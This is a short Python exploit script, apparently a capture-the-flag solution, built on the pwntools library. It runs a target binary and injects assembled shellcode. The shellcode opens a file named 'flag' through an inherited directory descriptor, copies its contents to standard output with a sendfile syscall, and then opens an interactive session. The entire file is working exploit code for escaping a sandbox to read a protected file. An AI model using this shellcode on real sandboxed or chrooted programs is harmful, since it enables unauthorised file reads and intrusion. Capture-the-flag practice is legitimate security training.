#!/bin/python

import os
import sys
from pwn import * 

context.arch = 'amd64'


proc = process([sys.argv[1], '/'])

sc_bytes = shellcraft.openat(3, 'flag', os.O_RDONLY) + \
'''
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 58
    mov rax, 40
    syscall
''' 
proc.send(asm(sc_bytes))
proc.interactive()
